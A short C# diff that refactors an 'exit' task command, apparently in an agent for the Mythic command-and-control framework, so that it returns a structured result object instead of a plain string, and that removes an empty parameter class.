@@ -6,14 +6,17 @@ namespace Tasks.Commands
     {
         public override string Name => "exit";
 
-        public override string Execute(MythicTask task)
+        public override MythicTaskResult Execute(MythicTask task)
         {
-            return "Tasked agent to exit";
+            var result = new MythicTaskResult
+            {
+                task_id = task.id,
+                user_output = "Tasked agent to exit",
+                completed = true,
+                status = "success"
+            };
+
+            return result;
         }
-    }
-
-    public class ExitParam
-    {
-
     }
 }
